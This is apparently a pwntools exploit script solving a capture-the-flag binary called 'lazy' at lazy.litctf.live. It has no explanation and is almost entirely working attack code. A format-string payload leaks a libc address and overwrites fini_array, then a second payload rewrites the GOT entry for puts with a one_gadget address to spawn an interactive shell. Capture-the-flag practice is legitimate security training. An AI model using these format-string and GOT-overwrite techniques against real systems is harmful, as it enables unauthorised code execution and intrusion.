from pwn import *
from sys import *

context.arch = 'amd64'

context.log_level = 'warning'

elf = ELF("./lazy")
libc = ELF("./libc-2.31.so")
p = process("./lazy")

HOST = "lazy.litctf.live"
PORT = 1337

cmd = """
b*main+95
b*main+155
b*0x0000000000401191
"""

if(argv[1] == 'gdb'):
    gdb.attach(p,cmd)
elif(argv[1] == 'rm'):
    p = remote(HOST,PORT)

#0x26d0a
#b'0x4242424241414141_XXXXXXXXXXXXXXXXXXXXXXXXXXAAAABBBBYour criticism will be taken into consideration.\n' 10
fini_array = 0x4031c8
adrress = p64(fini_array)
payload = b"%71$p"
payload += "%{}c".format(0x1070-14).encode()
payload += "%{}$hn_".format(10).encode()
payload = payload.ljust(0x20,b'X')
payload += adrress
p.send(payload)
p.recvuntil("You said:\n")
leak = eval(p.recvline(14))
libc.address = leak - 0x26d0a
one_gadget = libc.address + 0xcbd1a

payload2 = fmtstr_payload(6, {elf.got['puts'] : one_gadget}, write_size = 'short')
p.sendline(payload2)

p.interactive()
